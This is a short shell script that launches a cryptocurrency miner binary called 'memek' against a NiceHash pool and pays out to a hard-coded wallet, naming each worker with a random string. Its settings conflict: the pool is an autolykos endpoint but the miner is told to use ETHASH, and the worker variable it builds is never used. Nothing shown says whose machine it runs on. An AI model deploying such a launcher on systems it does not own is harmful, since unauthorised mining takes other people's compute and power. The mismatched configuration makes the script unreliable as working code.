POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-P)
chmod +x memek
./memek --algo ETHASH --pool $POOL --user $WALLET.P100
